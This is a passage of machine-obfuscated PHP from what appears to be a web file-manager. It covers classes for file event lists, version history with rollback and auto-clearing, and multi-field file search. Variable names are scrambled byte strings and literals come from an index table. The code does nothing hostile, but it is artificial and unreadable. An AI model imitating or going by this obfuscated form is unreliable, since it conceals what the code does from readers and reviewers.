Model($Òç’•ÂÔ[1482])->sourceInfo($Æ¾€íÒÖ); $ÛÕô­¥ = array($Òç’•ÂÔ[503] => $Æ¾€íÒÖ); if ($¡å®ó[$Òç’•ÂÔ[497]] == $Òç’•ÂÔ[91]) { $…‘’ıƒ = Model($Òç’•ÂÔ[1482])->listSearchChildren($Æ¾€íÒÖ, 20000); $…‘’ıƒ[] = $Æ¾€íÒÖ . $Òç’•ÂÔ[464]; $ÛÕô­¥ = array($Òç’•ÂÔ[193] => array($Òç’•ÂÔ[7], $…‘’ıƒ)); } $¹½‡§Ó¹ = $this->where($ÛÕô­¥)->order($Òç’•ÂÔ[2384])->selectPage(); if ($¹½‡§Ó¹[$Òç’•ÂÔ[444]][$Òç’•ÂÔ[445]] == 0) { $¹½‡§Ó¹[$Òç’•ÂÔ[444]][$Òç’•ÂÔ[445]] = 1; $¹½‡§Ó¹[$Òç’•ÂÔ[447]] = array(array($Òç’•ÂÔ[503] => $Æ¾€íÒÖ, $Òç’•ÂÔ[2365] => $¡å®ó[$Òç’•ÂÔ[192]], $Òç’•ÂÔ[1921] => $¡å®ó[$Òç’•ÂÔ[538]], $Òç’•ÂÔ[508] => $Òç’•ÂÔ[2385], $Òç’•ÂÔ[509] => $¡å®ó[$Òç’•ÂÔ[233]], $Òç’•ÂÔ[1923] => $Òç’•ÂÔ[12])); } return $this->eventListParse($¹½‡§Ó¹, $Æ¾€íÒÖ); } private function eventListParse($Ã…Ì¦š®, $¸ùÉæı) { $æ Š¢… =& $_SERVER[±Ö‰ô½¯]; $Ğ¼¡ŸÇ¾ = $Ã…Ì¦š®[$æ Š¢…[447]]; $ş¨óïöÔ = array_to_keyvalue($Ğ¼¡ŸÇ¾, $æ Š¢…[12], $æ Š¢…[193]); $ÍÄ¨Ú†… = array_to_keyvalue($Ğ¼¡ŸÇ¾, $æ Š¢…[12], $æ Š¢…[2371]); foreach ($Ğ¼¡ŸÇ¾ as $ñ±€ÌŒŸ) { $Ğ²üˆÈ² = $ñ±€ÌŒŸ[$æ Š¢…[537]]; if ($ñ±€ÌŒŸ[$æ Š¢…[33]] == $æ Š¢…[640] && isset($Ğ²üˆÈ²[$æ Š¢…[1292]])) { $ş¨óïöÔ[] = $Ğ²üˆÈ²[$æ Š¢…[1292]] . $æ Š¢…[12]; $ş¨óïöÔ[] = $Ğ²üˆÈ²[$æ Š¢…[1293]] . $æ Š¢…[12]; } if ($ñ±€ÌŒŸ[$æ Š¢…[33]] == $æ Š¢…[2381] && isset($Ğ²üˆÈ²[$æ Š¢…[193]])) { $ş¨óïöÔ[] = $Ğ²üˆÈ²[$æ Š¢…[193]] . $æ Š¢…[12]; } } $ş¨óïöÔ = array_merge($ş¨óïöÔ, $ÍÄ¨Ú†…, array($¸ùÉæı . $æ Š¢…[12])); $ş¨óïöÔ = array_unique($ş¨óïöÔ); $§­¬“Ç = array_unique(array_to_keyvalue($Ğ¼¡ŸÇ¾, $æ Š¢…[12], $æ Š¢…[1542])); $±è¨•š = Model($æ Š¢…[614])->userListInfo($§­¬“Ç); $«½—äÀê = Model($æ Š¢…[930])->sourceListInfo($ş¨óïöÔ, !0); foreach ($Ğ¼¡ŸÇ¾ as &$ñ±€ÌŒŸ) { if ($ñ±€ÌŒŸ[$æ Š¢…[33]] == $æ Š¢…[640] && isset($ñ±€ÌŒŸ[$æ Š¢…[537]][$æ Š¢…[1292]])) { $ñ±€ÌŒŸ[$æ Š¢…[537]][$æ Š¢…[1292]] = $«½—äÀê[$ñ±€ÌŒŸ[$æ Š¢…[537]][$æ Š¢…[1292]]]; $ñ±€ÌŒŸ[$æ Š¢…[537]][$æ Š¢…[1293]] = $«½—äÀê[$ñ±€ÌŒŸ[$æ Š¢…[537]][$æ Š¢…[1293]]]; } if ($ñ±€ÌŒŸ[$æ Š¢…[33]] == $æ Š¢…[2381] && isset($ñ±€ÌŒŸ[$æ Š¢…[537]][$æ Š¢…[193]])) { $ñ±€ÌŒŸ[$æ Š¢…[537]][$æ Š¢…[193]] = $«½—äÀê[$ñ±€ÌŒŸ[$æ Š¢…[537]][$æ Š¢…[193]]]; } $ñ±€ÌŒŸ[$æ Š¢…[90]] = $«½—äÀê[$ñ±€ÌŒŸ[$æ Š¢…[193]]]; $ñ±€ÌŒŸ[$æ Š¢…[2386]] = $«½—äÀê[$ñ±€ÌŒŸ[$æ Š¢…[2371]]]; if ($ñ±€ÌŒŸ[$æ Š¢…[33]] == $æ Š¢…[1280]) { $ñ±€ÌŒŸ[$æ Š¢…[2386]] = $ñ±€ÌŒŸ[$æ Š¢…[90]]; $ñ±€ÌŒŸ[$æ Š¢…[2371]] = $ñ±€ÌŒŸ[$æ Š¢…[2386]][$æ Š¢…[193]]; $ñ±€ÌŒŸ[$æ Š¢…[90]] = !1; $ñ±€ÌŒŸ[$æ Š¢…[193]] = $æ Š¢…[12]; } $ñ±€ÌŒŸ[$æ Š¢…[2310]] = $±è¨•š[$ñ±€ÌŒŸ[$æ Š¢…[1542]]]; } unset($ñ±€ÌŒŸ); $Ã…Ì¦š®[$æ Š¢…[447]] = $Ğ¼¡ŸÇ¾; return $Ã…Ì¦š®; } public function removeBySource($äÅÍ£Ÿ·) { $èãî›¹ = array($_SERVER[±Ö‰ô½¯][503] => $äÅÍ£Ÿ·); $this->where($èãî›¹)->remove(); } } class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\157\165\x72\x63\145\137\x68\x69\163\164\x6f\x72\171"; public function historyCount($ĞğŒØÆà) { $óÆ¢Š¶Ä =& $_SERVER[±Ö‰ô½¯]; if (!$ĞğŒØÆà) { return array(); } if (is_string($ĞğŒØÆà) || is_int($ĞğŒØÆà)) { $ĞğŒØÆà = array($ĞğŒØÆà); } $ÚğÄÉ¶Í = array($óÆ¢Š¶Ä[193], $óÆ¢Š¶Ä[2387] => $óÆ¢Š¶Ä[582]); $ÜÆ öÇÏ = array($óÆ¢Š¶Ä[193] => array($óÆ¢Š¶Ä[7], $ĞğŒØÆà)); $ ‰¢í¤‚ = $this->field($ÚğÄÉ¶Í)->where($ÜÆ öÇÏ)->group($óÆ¢Š¶Ä[193])->select(); return array_to_keyvalue($ ‰¢í¤‚, $óÆ¢Š¶Ä[193], $óÆ¢Š¶Ä[582]); } public function addHistory($¶¥ÃÃµü, $Í€ÆÙÊï = '') { $¿Ïğ…üÅ =& $_SERVER[±Ö‰ô½¯]; $°²ä»¿ = array($¿Ïğ…üÅ[503] => $¶¥ÃÃµü[$¿Ïğ…üÅ[193]], $¿Ïğ…üÅ[1921] => isset($¶¥ÃÃµü[$¿Ïğ…üÅ[540]]) ? $¶¥ÃÃµü[$¿Ïğ…üÅ[540]] : $¶¥ÃÃµü[$¿Ïğ…üÅ[538]], $¿Ïğ…üÅ[555] => $¶¥ÃÃµü[$¿Ïğ…üÅ[554]], $¿Ïğ…üÅ[637] => $¶¥ÃÃµü[$¿Ïğ…üÅ[79]], $¿Ïğ…üÅ[2388] => $Í€ÆÙÊï); if ($GLOBALS[$¿Ïğ…üÅ[6]][$¿Ïğ…üÅ[92]][$¿Ïğ…üÅ[1354]] >= 1) { $this->historyAutoClear($°²ä»¿[$¿Ïğ…üÅ[193]]); $this->add($°²ä»¿); } Hook::trigger($¿Ïğ…üÅ[2389], $°²ä»¿); Model($¿Ïğ…üÅ[2390])->eventFileEdit($¶¥ÃÃµü[$¿Ïğ…üÅ[193]]); } private function historyAutoClear($ãšÇ¶Åå) { $£×„½á¥ =& $_SERVER[±Ö‰ô½¯]; $À©°û§º = Model($£×„½á¥[870])->get($£×„½á¥[1376]); $å§¬ÈùĞ = intval($GLOBALS[$£×„½á¥[6]][$£×„½á¥[92]][$£×„½á¥[1354]]); $ŠåøÓ²‹ = $À©°û§º == $£×„½á¥[1377] ? min(5, $å§¬ÈùĞ) : $å§¬ÈùĞ; $ŠåøÓ²‹ = $ŠåøÓ²‹ <= 0 ? 0 : $ŠåøÓ²‹ - 1; if ($ŠåøÓ²‹ >= 499) { return; } $’†À–Ï× = array($£×„½á¥[503] => $ãšÇ¶Åå); $şšã¨¸Œ = $this->field($£×„½á¥[2391])->where($’†À–Ï×)->order($£×„½á¥[2384])->select(); if (!$şšã¨¸Œ || $ŠåøÓ²‹ >= count($şšã¨¸Œ)) { return; } $±Ÿ±Ô  = array_to_keyvalue($şšã¨¸Œ, $£×„½á¥[12], $£×„½á¥[484]); $±Ÿ±Ô  = array_slice($±Ÿ±Ô , $ŠåøÓ²‹); $áÉÌ¨¦Ş = array_to_keyvalue($şšã¨¸Œ, $£×„½á¥[12], $£×„½á¥[554]); $áÉÌ¨¦Ş = array_slice($áÉÌ¨¦Ş, $ŠåøÓ²‹); if (!$±Ÿ±Ô  || !$áÉÌ¨¦Ş) { return; } $’†À–Ï× = array($£×„½á¥[505] => array($£×„½á¥[7], $±Ÿ±Ô )); $this->where($’†À–Ï×)->delete(); Model($£×„½á¥[557])->remove($áÉÌ¨¦Ş); } public function listData($é¶’¿¨) { $«Šóó† =& $_SERVER[±Ö‰ô½¯]; $¬¢®§¸ù = array($«Šóó†[503] => $é¶’¿¨); $¨¿…û©² = $«Šóó†[2392]; $¶ÄÊĞŞê = $this->field($¨¿…û©²)->where($¬¢®§¸ù)->order($«Šóó†[2384])->selectPage(); $this->_listAppendUser($¶ÄÊĞŞê[$«Šóó†[447]]); $ÙŠ†’±½ = Model($«Šóó†[870])->get($«Šóó†[1376]); $ø¡‹ıÌë = 5; if ($ÙŠ†’±½ == $«Šóó†[1377]) { $¶ÄÊĞŞê[$«Šóó†[447]] = array_slice($¶ÄÊĞŞê[$«Šóó†[447]], 0, $ø¡‹ıÌë); $¶ÄÊĞŞê[$«Šóó†[444]] = array($«Šóó†[2393] => 1, $«Šóó†[2394] => 20, $«Šóó†[2395] => 1, $«Šóó†[2396] => count($¶ÄÊĞŞê[$«Šóó†[447]])); } return $¶ÄÊĞŞê; } protected function _listAppendUser(&$ìğÕà) { $Öä¶ò¼’ =& $_SERVER[±Ö‰ô½¯]; $ßÚ‘Üı® = array_to_keyvalue($ìğÕà, $Öä¶ò¼’[12], $Öä¶ò¼’[1542]); $ø”ş—ğ« = Model($Öä¶ò¼’[614])->userListInfo($ßÚ‘Üı®); foreach ($ìğÕà as &$‹•ˆ¿‘Å) { $Åù´…ù = $‹•ˆ¿‘Å[$Öä¶ò¼’[1542]]; $‹•ˆ¿‘Å[$Öä¶ò¼’[538]] = $ø”ş—ğ«[$Åù´…ù] ? $ø”ş—ğ«[$Åù´…ù] : !1; } unset($‹•ˆ¿‘Å); } public function fileInfo($ö¯ƒº¢î, $ÇÌ™“Îé = false) { $òÃ×á¡… =& $_SERVER[±Ö‰ô½¯]; $œ†¡ÈÌì = $this->tablePrefix; $ ¤Áéï = "{$œ†¡ÈÌì}\151\x6f\x5f\x66\x69\154\145\40\x66\x69\x6c\145\163\x20\157\156\40\146\151\x6c\x65\163\x2e\x66\151\x6c\x65\x49\104\x20\75\40\x68\x69\163\x74\157\x72\171\x2e\x66\x69\154\145\111\x44"; $·ñøÄ¶É = $this->alias($òÃ×á¡…[2397])->where(array($òÃ×á¡…[505] => $ö¯ƒº¢î))->join($ ¤Áéï, $òÃ×á¡…[2398])->find(); if ($·ñøÄ¶É && $ÇÌ™“Îé) { $õ’Æ¥øú = array($òÃ×á¡…[193] => $·ñøÄ¶É[$òÃ×á¡…[193]], $òÃ×á¡…[484] => array($òÃ×á¡…[1129], $ö¯ƒº¢î)); $·ñøÄ¶É[$òÃ×á¡…[1814]] = $this->where($õ’Æ¥øú)->count(); } return $·ñøÄ¶É; } public function removeItem($ˆÁı˜) { $·Ìó†Ä =& $_SERVER[±Ö‰ô½¯]; $àŸ×¨À‚ = array($·Ìó†Ä[505] => $ˆÁı˜); $ò¢ÚŒù = $this->where($àŸ×¨À‚)->find(); if ($ò¢ÚŒù) { $ïï¨…Ğ = $this->where($àŸ×¨À‚)->delete(); Model($·Ìó†Ä[557])->remove($ò¢ÚŒù[$·Ìó†Ä[554]]); return $ïï¨…Ğ; } return !1; } public function removeBySource($ÍŞÔ“ı¢) { $Ê½×ïâ› =& $_SERVER[±Ö‰ô½¯]; if (!$ÍŞÔ“ı¢) { return !1; } if (!is_array($ÍŞÔ“ı¢)) { $ÍŞÔ“ı¢ = array($ÍŞÔ“ı¢); } $ëİ—¯¥Ñ = array($Ê½×ïâ›[503] => array($Ê½×ïâ›[7], $ÍŞÔ“ı¢)); $Ï„šÔ¯¢ = $this->field($Ê½×ïâ›[555])->where($ëİ—¯¥Ñ)->select(); if ($Ï„šÔ¯¢) { $this->where($ëİ—¯¥Ñ)->delete(); $¿ÍÚ÷Ã = array_to_keyvalue($Ï„šÔ¯¢, $Ê½×ïâ›[12], $Ê½×ïâ›[554]); Model($Ê½×ïâ›[557])->remove($¿ÍÚ÷Ã); } return !0; } public function setDetail($š´š²Ú, $Áì™´í) { $½êÏúö =& $_SERVER[±Ö‰ô½¯]; return $this->where(array($½êÏúö[505] => $š´š²Ú))->save(array($½êÏúö[2388] => $Áì™´í)); } public function rollbackToItem($ÎÓ¾è®…, $…¶äÎã) { $‡à…şÅ =& $_SERVER[±Ö‰ô½¯]; $Ş¤°ÆÍ‡ = Model($‡à…şÅ[930])->sourceInfo($ÎÓ¾è®…); $this->addHistory($Ş¤°ÆÍ‡, LNG($‡à…şÅ[2399])); $Ç¼œ¡çÓ = $this->find($…¶äÎã); $±µÏı£ó = array($‡à…şÅ[554] => $Ç¼œ¡çÓ[$‡à…şÅ[554]], $‡à…şÅ[79] => $Ç¼œ¡çÓ[$‡à…şÅ[79]], $‡à…şÅ[88] => time(), $‡à…şÅ[540] => USER_ID); Model($‡à…şÅ[930])->where(array($‡à…şÅ[193] => $ÎÓ¾è®…))->save($±µÏı£ó); return $this->where(array($‡à…şÅ[505] => $…¶äÎã))->delete(); } public function clearSame($âÎ‚ºÔø) { $Ó‹ç¶ =& $_SERVER[±Ö‰ô½¯]; $Ş´ = $this->listData($âÎ‚ºÔø); $ñ½Ï“ã¼ = array_to_keyvalue_group($Ş´, $Ó‹ç¶[554]); $¼ËİŠ«‰ = array(); $ƒÍ×´Şâ = array(); foreach ($ñ½Ï“ã¼ as $“ŸšËÛ) { if (!$“ŸšËÛ || count($“ŸšËÛ) <= 1) { continue; } foreach ($“ŸšËÛ as $š´Ø›­ù) { $¼ËİŠ«‰[] = $š´Ø›­ù[$Ó‹ç¶[554]]; $ƒÍ×´Şâ[] = $š´Ø›­ù[$Ó‹ç¶[484]]; } } if (!$ƒÍ×´Şâ) { return; } $this->where(array($Ó‹ç¶[484] => array($Ó‹ç¶[7], $ƒÍ×´Şâ)))->delete(); Model($Ó‹ç¶[557])->remove($¼ËİŠ«‰); } public function userSpace() { $‘…œÚ ø =& $_SERVER[±Ö‰ô½¯]; $èˆªº©ö = $this->tablePrefix; $Æù‚®ê = array($‘…œÚ ø[1921] => USER_ID); $Ââ†Ø›Ò = "{$èˆªº©ö}\x69\x6f\137\146\151\x6c\145\40\x66\x69\154\145\x73\x20\x6f\156\40\146\151\x6c\x65\163\x2e\x66\151\154\145\111\104\40\75\x20\150\151\163\x74\x6f\162\x79\56\x66\151\x6c\145\111\x44"; return $this->alias($‘…œÚ ø[2397])->where($Æù‚®ê)->join($Ââ†Ø›Ò, $‘…œÚ ø[2398])->sum($‘…œÚ ø[79]); } } class SourceListSearchModel extends SourceListMoveModel { public static function fileTypeWhere($¢™ÍïîÆ) { $Çô†ß« =& $_SERVER[±Ö‰ô½¯]; $÷È¶âô‡ = KodIO::fileTypeList(); $£Ğ…µÍÁ = $÷È¶âô‡[$¢™ÍïîÆ]; if (!$£Ğ…µÍÁ) { return array(); } $š¤¯¦é = $£Ğ…µÍÁ[$Çô†ß«[168]]; $Ìíéßµ´ = $Çô†ß«[7]; if (!$£Ğ…µÍÁ[$Çô†ß«[168]]) { $ÎÒ¤Ú¾¾ = array_to_keyvalue($÷È¶âô‡, $Çô†ß«[12], $Çô†ß«[168]); $š¤¯¦é = implode($Çô†ß«[50], $ÎÒ¤Ú¾¾); $Ìíéßµ´ = $Çô†ß«[2400]; } $Œë¾›®’ = explode($Çô†ß«[50], trim($š¤¯¦é, $Çô†ß«[50])); return array($Ìíéßµ´, $Œë¾›®’); } public function listPathType($ªØà÷±†) { $£ó…ëÊ  =& $_SERVER[±Ö‰ô½¯]; $˜ÏşÀ­À = $this->fileTypeWhere($ªØà÷±†); if (!$˜ÏşÀ­À) { return array(); } $¥ì´Àß  = USER_ID; $ÑÖåçÆ¿ = Model($£ó…ëÊ [614])->getInfo($¥ì´Àß ); $×Ÿñ® ¢ = array($£ó…ëÊ [668] => SourceModel::TYPE_USER, $£ó…ëÊ [601] => array($£ó…ëÊ [632], $£ó…ëÊ [610] . $ÑÖåçÆ¿[$£ó…ëÊ [90]][$£ó…ëÊ [193]] . $£ó…ëÊ [633]), $£ó…ëÊ [669] => $¥ì´Àß , $£ó…ëÊ [666] => 0, $£ó…ëÊ [667] => $˜ÏşÀ­À); return $this->listSource($×Ÿñ® ¢); } public function listSearch($³Ñ´‚Ó, $Ø¾‚ä¶ = 300) { $ŠçñÀ“÷ =& $_SERVER[±Ö‰ô½¯]; if (isset($³Ñ´‚Ó[$ŠçñÀ“÷[2232]]) && $³Ñ´‚Ó[$ŠçñÀ“÷[2232]]) { $³Ñ´‚Ó[$ŠçñÀ“÷[2232]] = str_replace($ŠçñÀ“÷[472], $ŠçñÀ“÷[2401], trim($³Ñ´‚Ó[$ŠçñÀ“÷[2232]])); } $”ç‹½Å = $this->_parseSearchWhere($³Ñ´‚Ó); if (!isset($”ç‹½Å[$ŠçñÀ“÷[517]])) { $”ç‹½Å[$ŠçñÀ“÷[517]] = 0; } $£ğËÙ™Ó = $ŠçñÀ“÷[2402]; $ÌôÛ§ğ£ = $”ç‹½Å; $å€÷É®½ = $£ğËÙ™Ó; $this->_listSearchBindPinyin($³Ñ´‚Ó, $”ç‹½Å, $£ğËÙ™Ó); $this->alias($ŠçñÀ“÷[530])->_makeOrder(); $”ç‹½Å = $this->parseWhereLike($”ç‹½Å); $«ÖöÌ›Ş = $this->distinct(!0)->field($£ğËÙ™Ó)->where($”ç‹½Å)->selectPage($Ø¾‚ä¶); if ($GLOBALS[$ŠçñÀ“÷[6]][$ŠçñÀ“÷[469]][$ŠçñÀ“÷[470]] && Input::check($³Ñ´‚Ó[$ŠçñÀ“÷[2232]], $ŠçñÀ“÷[675]) && $«ÖöÌ›Ş[$ŠçñÀ“÷[444]][$ŠçñÀ“÷[430]] == 1 && $«ÖöÌ›Ş[$ŠçñÀ“÷[444]][$ŠçñÀ“÷[445]] == 0) { $«ÖöÌ›Ş = $this->distinct(!0)->field($£ğËÙ™Ó)->where($ÌôÛ§ğ£)->limit(1000)->select(); $«ÖöÌ›Ş = array_page_split($«ÖöÌ›Ş, !1, $Ø¾‚ä¶); } $this->_listSearchFileContent($«ÖöÌ›Ş, $³Ñ´‚Ó, $å€÷É®½, $ÌôÛ§ğ£); $this->_listSearchDesc($«ÖöÌ›Ş, $³Ñ´‚Ó, $å€÷É®½); $this->_listSearchTag($«ÖöÌ›Ş, $³Ñ´‚Ó, $å€÷É®½); $this->_listSearchGroupTag($«ÖöÌ›Ş, $³Ñ´‚Ó, $å€÷É®½); $this->_listDataApply($«ÖöÌ›Ş[$ŠçñÀ“÷[447]]); $this->_listMake($«ÖöÌ›Ş); return $«ÖöÌ›Ş; } private function _listSearchFileContent(&$ÜÑŞƒÍ‡, $¯ÀäÄôå, $ûß®‹Ü, $ºûûô¿ì) { $ô¦Ë£ÑÑ =& $_SERVER[±Ö‰ô½¯]; if (!$¯ÀäÄôå[$ô¦Ë£ÑÑ[2232]] || $ÜÑŞƒÍ‡[$ô¦Ë£ÑÑ[444]][$ô¦Ë£ÑÑ[430]] > 1) { return; } if (!isset($ºûûô¿ì[$ô¦Ë£ÑÑ[32]]) || !is_array($¯ÀäÄôå[$ô¦Ë£ÑÑ[554]])) { return; } $ºûûô¿ì[$ô¦Ë£ÑÑ[554]] = array($ô¦Ë£ÑÑ[7], $¯ÀäÄôå[$ô¦Ë£ÑÑ[554]]); unset($ºûûô¿ì[$ô¦Ë£ÑÑ[32]]); unset($¯ÀäÄôå[$ô¦Ë£ÑÑ[554]]); $Äó½ëß = $this->field($ûß®‹Ü)->where($ºûûô¿ì)->limit($ô¦Ë£ÑÑ[2403])->select(); if (!$Äó½ëß || count($Äó½ëß) == 0) { return; } $ÜÑŞƒÍ‡[$ô¦Ë£ÑÑ[447]] = array_merge($Äó½ëß, $ÜÑŞƒÍ‡[$ô¦Ë£ÑÑ[447]]); $ÜÑŞƒÍ‡[$ô¦Ë£ÑÑ[444]][$ô¦Ë£ÑÑ[445]] += count($Äó½ëß); } private function _listSearchTag(&$ÖãÅÇóü, $—×•µğÔ, $õøİŠÂ¦) { $³Åõ—ìö =& $_SERVER[±Ö‰ô½¯]; if (empty($—×•µğÔ[$³Åõ—ìö[2098]]) || !in_array($³Åõ—ìö[2404], $—×•µğÔ[$³Åõ—ìö[2098]])) { return; } if (!$—×•µğÔ[$³Åõ—ìö[2232]] || $ÖãÅÇóü[$³Åõ—ìö[444]][$³Åõ—ìö[430]] > 1) { return; } $ÕÀô»„Ñ = Model($³Åõ—ìö[2405])->listData(); $åÀÕµıÎ = array(); $•Æğ¼€™ = $—×•µğÔ[$³Åõ—ìö[2232]]; foreach ($ÕÀô»„Ñ as $³¸ÌÛ«) { $¹ÉÙ‘Œ = $³¸ÌÛ«[$³Åõ—ìö[32]]; $‰¼š›‹š = str_replace($³Åõ—ìö[53], $³Åõ—ìö[12], Pinyin::get($¹ÉÙ‘Œ)); if (stripos($¹ÉÙ‘Œ, $•Æğ¼€™) !== !1 || stripos($‰¼š›‹š, $•Æğ¼€™) !== !1) { $åÀÕµıÎ[] = $³¸ÌÛ«[$³Åõ—ìö[484]]; } } if (!$åÀÕµıÎ) { return; } $Ï­Ë¤»‘ = array($³Åõ—ìö[512] => array($³Åõ—ìö[7], $åÀÕµıÎ), $³Åõ—ìö[1542] => USER_ID); $ãŸĞæ¯ = Model($³Åõ—ìö[514])->field($³Åõ—ìö[87])->where($Ï­Ë¤»‘)->select(); $ãŸĞæ¯ = array_to_keyvalue($ãŸĞæ¯, $³Åõ—ìö[12], $³Åõ—ìö[87]); $ÄÊ§§™ = array_unique($ãŸĞæ¯); $this->_listSearchMerge($ÖãÅÇóü, $—×•µğÔ, $õøİŠÂ¦, $ÄÊ§§™); } private function _listSearchDesc(&$öˆ†¤¯Ÿ, $’Áğ«¬², $È»¤ëıë) { $¥¹è€ =& $_SERVER[±Ö‰ô½¯]; if (empty($’Áğ«¬²[$¥¹è€[2098]]) || !in_array($¥¹è€[537], $’Áğ«¬²[$¥¹è€[2098]])) { return; } if (!$’Áğ«¬²[$¥¹è€[2232]] || $öˆ†¤¯Ÿ[$¥¹è€[444]][$¥¹è€[430]] > 1) { return; } $­ãÒæùŞ = array($¥¹è€[95] => $¥¹è€[537], $¥¹è€[452] => array($¥¹è€[471], $¥¹è€[2234] . $’Áğ«¬²[$¥¹è€[2232]] . $¥¹è€[2234])); $¸‡ªãüç = !1; if ($¸‡ªãüç) { $ŞÇú£íù = $this->listSearchChildren($’Áğ«¬²[$¥¹è€[192]]); $ŞÇú£íù = array_unique($ŞÇú£íù); if (!$ŞÇú£íù) { return; } $­ãÒæùŞ[$¥¹è€[193]] = array($¥¹è€[7], $ŞÇú£íù); } $©ØŸ’Å = Model($¥¹è€[652])->field($¥¹è€[193])->where($­ãÒæùŞ)->limit(5000)->select(); $ó”™Ú¶¤ = array_to_keyvalue($©ØŸ’Å, $¥¹è€[12], $¥¹è€[193]); $this->_listSearchMerge($öˆ†¤¯Ÿ, $’Áğ«¬², $È»¤ëıë, $ó”™Ú¶¤); } private function _listSearchGroupTag(&$…»ÊØ£, $¬¶Ïº”ñ, $Ê“îŞ“›) { $¹ŞØüÊø =& $_SERVER[±Ö‰ô½¯]; if (empty($¬¶Ïº”ñ[$¹ŞØüÊø[2098]]) || !in_array($¹ŞØüÊø[2404], $¬¶Ïº”ñ[$¹ŞØüÊø[2098]])) { return; } if (!$¬¶Ïº”ñ[$¹ŞØüÊø[2232]] || $…»ÊØ£[$¹ŞØüÊø[444]][$¹ŞØüÊø[430]] > 1 || !$¬¶Ïº”ñ[$¹ŞØüÊø[192]]) { return; } $•®€¯º’ = $this->sourceInfo($¬¶Ïº”ñ[$¹ŞØüÊø[192]]); if (!$•®€¯º’ || $•®€¯º’[$¹ŞØüÊø[190]] != SourceModel::TYPE_GROUP) { return; } $ˆËÀ©³÷ = $•®€¯º’[$¹ŞØüÊø[586]]; $‰ïÓÑ = Model($¹ŞØüÊø[2406])->get($ˆËÀ©³÷); $ÖÕÂ¦ÄÍ = array(); $åóî¨ = $¬¶Ïº”ñ[$¹ŞØüÊø[2232]]; foreach ($‰ïÓÑ[$¹ŞØüÊø[447]] as $äÜ×¶£) { $İšÎÁ§ = $äÜ×¶£[$¹ŞØüÊø[32]]; $Øàêüê = str_replace($¹ŞØüÊø[53], $¹ŞØüÊø[12], Pinyin::get($İšÎÁ§)); if (stripos($İšÎÁ§, $åóî¨) !== !1 || stripos($Øàêüê, $åóî¨) !== !1) { $ÖÕÂ¦ÄÍ[] = $äÜ×¶£[$¹ŞØüÊø[484]]; } } if (!$ÖÕÂ¦ÄÍ) { return; } $áë¢ÉÙ¯ = array($¹ŞØüÊø[512] => array($¹ŞØüÊø[7], $ÖÕÂ¦ÄÍ), $¹ŞØüÊø[1542] => 0, $¹ŞØüÊø[33] => $¹ŞØüÊø[1440] . $ˆËÀ©³÷); $ï©¤øöó = Model($¹ŞØüÊø[514])->field($¹ŞØüÊø[87])->where($áë¢ÉÙ¯)->select(); $ï©¤øöó = array_to_keyvalue($ï©¤øöó, $¹ŞØüÊø[12], $¹ŞØüÊø[87]); $úËíõò” = array_unique($ï©¤øöó); $this->_listSearchMerge($…»ÊØ£, $¬¶Ïº”ñ, $Ê“îŞ“›, $úËíõò”); } private function _listSearchMerge(&$Ä½ğˆ—ğ, $Ş¾Ë»Ì½, $Öûå¡ş, $üÙŒú§á) { $ùÑÕÁ«Ä =& $_SERVER[±Ö‰ô½¯]; if (!$üÙŒú§á) { return; } $âÊ‹±§ = array_to_keyvalue($Ä½ğˆ—ğ[$ùÑÕÁ«Ä[447]], $ùÑÕÁ«Ä[12], $ùÑÕÁ«Ä[193]); $ª³½Ş£± = array_diff($üÙŒú§á, $âÊ‹±§); if (!$ª³½Ş£±) { return; } $œÚ”®”‰ = array($ùÑÕÁ«Ä[193] => array($ùÑÕÁ«Ä[7], $ª³½Ş£±)); $üØ‡± = $this->field($Öûå¡ş)->where($œÚ”®”‰)->select(); if (!$üØ‡±) { return; } $ØäåÕ½À = array(); foreach ($üØ‡± as $¸¦ ïÕ§) { if ($this->_listSearchFilter($¸¦ ïÕ§, $Ş¾Ë»Ì½)) { $ØäåÕ½À[] = $¸¦ ïÕ§; } } $Ä½ğˆ—ğ[$ùÑÕÁ«Ä[447]] = array_merge($ØäåÕ½À, $Ä½ğˆ—ğ[$ùÑÕÁ«Ä[447]]); $Ä½ğˆ—ğ[$ùÑÕÁ«Ä[444]][$ùÑÕÁ«Ä[445]] += count($ØäåÕ½À); } private function _listSearchFilter($ô¨Ò‹ö², $äÜŞ‚İÇ) { $½…Şä—¯ =& $_SERVER[±Ö‰ô½¯]; $¿ªè×µº = $ô¨Ò‹ö²[$½…Şä—¯[497]] == $½…Şä—¯[91]; if (!strstr($ô¨Ò‹ö²[$½…Şä—¯[601]], $½…Şä—¯[50] . $äÜŞ‚İÇ[$½…Şä—¯[192]] . $½…Şä—¯[50])) { return !1; } if (isset($äÜŞ‚İÇ[$½…Şä—¯[498]]) && $äÜŞ‚İÇ[$½…Şä—¯[498]] != $½…Şä—¯[876]) { if ($äÜŞ‚İÇ[$½…Şä—¯[498]] == $½…Şä—¯[78] && !$¿ªè×µº) { return !1; } if ($äÜŞ‚İÇ[$½…Şä—¯[498]] != $½…Şä—¯[78] && $¿ªè×µº) { return !1; } if (!strstr($ô¨Ò‹ö²[$½…Şä—¯[168]], $½…Şä—¯[50] . $äÜŞ‚İÇ[$½…Şä—¯[498]] . $½…Şä—¯[50])) { return !1; } } if (isset($äÜŞ‚İÇ[$½…Şä—¯[2407]]) && $äÜŞ‚İÇ[$½…Şä—¯[2407]] < $ô¨Ò‹ö²[$½…Şä—¯[79]]) { return !1; } if (isset($äÜŞ‚İÇ[$½…Şä—¯[2408]]) && $äÜŞ‚İÇ[$½…Şä—¯[2408]] > $ô¨Ò‹ö²[$½…Şä—¯[79]]) { return !1; } if (isset($äÜŞ‚İÇ[$½…Şä—¯[682]]) && $äÜŞ‚İÇ[$½…Şä—¯[682]] != $ô¨Ò‹ö²[$½…Şä—¯[540]]) { return !1; } return !0; } public function listSearchChildren($š¿ÄÓÍÏ, $ÌúÒÎÁñ = 5000) { $ü½Ã£™¤ =& $_SERVER[±Ö‰ô½¯]; $Óè¨ø¿ğ = array(); $˜°ş™Ğ¼ = $this->sourceInfo($š¿ÄÓÍÏ); $ÒŞ›”’á = array($ü½Ã£™¤[601] => array($ü½Ã£™¤[471], $˜°ş™Ğ¼[$ü½Ã£™¤[601]] . $˜°ş™Ğ¼[$ü½Ã£™¤[193]] . $ü½Ã£™¤[633])); $Å€òÆÈ» = $this->field($ü½Ã£™¤[79])->where($ÒŞ›”’á)->limit($ÌúÒÎÁñ + 1)->select(); $¾“¼Ü’À = is_array($Å€òÆÈ») ? count($Å€òÆÈ») : 0; if ($¾“¼Ü’À > $ÌúÒÎÁñ) { return $this->_listSearchChildrenNear($š¿ÄÓÍÏ, 